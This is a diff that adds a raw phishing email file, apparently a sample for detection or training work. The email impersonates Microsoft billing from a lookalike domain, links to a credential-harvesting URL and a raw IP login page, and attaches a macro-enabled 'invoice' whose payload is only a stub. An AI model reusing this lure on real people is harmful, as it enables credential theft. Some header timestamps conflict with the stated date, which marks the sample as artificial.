@@ -1,0 +1,93 @@
+Delivered-To: victim.user@gmail.com
+Received: by 2002:a05:6000:1f2b:0:0:0:0 with SMTP id x43csp192847qka;
+        Tue, 12 Feb 2026 14:22:51 -0800 (PST)
+X-Received: by 2002:a17:902:aa12:: with SMTP id k18mr18392045plr.112.1707776571023;
+        Tue, 12 Feb 2026 14:22:51 -0800 (PST)
+ARC-Seal: i=1; a=rsa-sha256; t=1707776571; cv=none;
+        d=google.com; s=arc-20160816;
+        b=Hk9D3OZxkP9Y+uL4e8KqJ+QZlW9w6x9tYzv9K7wCqJf3zY...
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20160816;
+        h=from:to:subject:date:message-id:mime-version:content-type;
+        bh=E2x9lA1F8J3kM6x9dE7v8tKz...;
+        b=Jk39xZlP9YlL9f8s8df7sd8f7sdf8sdf...
+ARC-Authentication-Results: i=1; mx.google.com;
+       spf=fail (google.com: domain of billing@micros0ft-support.com does not designate 185.234.219.55 as permitted sender) smtp.mailfrom=billing@micros0ft-support.com;
+       dkim=pass header.i=@micros0ft-support.com;
+       dmarc=fail (p=reject sp=reject dis=none) header.from=microsoft.com
+
+Received: from mail.micros0ft-support.com (mail.micros0ft-support.com. [185.234.219.55])
+        by mx.google.com with ESMTPS id r12si192847plr.56.2026.02.12.14.22.50
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Tue, 12 Feb 2026 14:22:50 -0800 (PST)
+Received-SPF: fail (google.com: domain of billing@micros0ft-support.com does not designate 185.234.219.55 as permitted sender) client-ip=185.234.219.55;
+
+Authentication-Results: mx.google.com;
+       spf=fail smtp.mailfrom=billing@micros0ft-support.com;
+       dkim=pass header.i=@micros0ft-support.com;
+       dmarc=fail header.from=microsoft.com
+
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=micros0ft-support.com; s=default;
+        h=from:to:subject:date:message-id:mime-version:content-type;
+        bh=E2x9lA1F8J3kM6x9dE7v8tKz...;
+        b=MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAu...
+
+Return-Path: <billing@micros0ft-support.com>
+From: "Microsoft Billing" <billing@microsoft.com>
+Reply-To: accounts@micros0ft-support.com
+To: victim.user@gmail.com
+Subject: Action Required: Subscription Renewal Failed
+Date: Tue, 12 Feb 2026 22:22:45 +0000
+Message-ID: <CA+78483929abcdf98273@mail.micros0ft-support.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="0000000000009c9c8f05b1234567"
+X-Mailer: Microsoft Outlook 16.0
+X-Originating-IP: [185.234.219.55]
+
+--0000000000009c9c8f05b1234567
+Content-Type: multipart/alternative; boundary="0000000000009c9c8f05b7654321"
+
+--0000000000009c9c8f05b7654321
+Content-Type: text/plain; charset="UTF-8"
+
+Dear Customer,
+
+We attempted to process your Microsoft 365 renewal, but your payment method was declined.
+
+Please update your billing information immediately to avoid service suspension:
+
+https://login.microsoftonline.com.billing.verify-user.com
+
+If you cannot click the link, copy and paste the following into your browser:
+
+http://185.234.219.55/secure-login
+
+Failure to act within 24 hours will result in account suspension.
+
+Microsoft Billing Team
+
+--0000000000009c9c8f05b7654321
+Content-Type: text/html; charset="UTF-8"
+
+<html>
+  <body>
+    <p>Dear Customer,</p>
+    <p>Your subscription renewal failed.</p>
+    <p><a href="https://login.microsoftonline.com.billing.verify-user.com">Update Billing Information</a></p>
+    <p>Or verify via IP address: <a href="http://185.234.219.55/secure-login">Verify Now</a></p>
+    <p><b>Failure to act within 24 hours will suspend your services.</b></p>
+  </body>
+</html>
+
+--0000000000009c9c8f05b7654321--
+
+--0000000000009c9c8f05b1234567
+Content-Type: application/vnd.ms-word.document.macroEnabled.12; name="Invoice_Feb2026.docm"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Invoice_Feb2026.docm"
+
+UEsDBBQABgAIAAAAIQAAAAAAAAAAAAAAAAAJAAAAd29yZC9VVAkAA9lqZWXZamVl
+dXgLAAEE6AMAAAToAwAAUEsBAhQAFAAIAAgAAAAhAAAAAAAAAAAAAAAAAAkAAAAAAAAAAQAAAAAAAAAA
+AAAAAHdvcmQvVVQFAAPZamVldXgLAAEE6AMAAAToAwAAUEsFBgAAAAABAAEANwAAAEIAAAAAAA==
+
+--0000000000009c9c8f05b1234567--
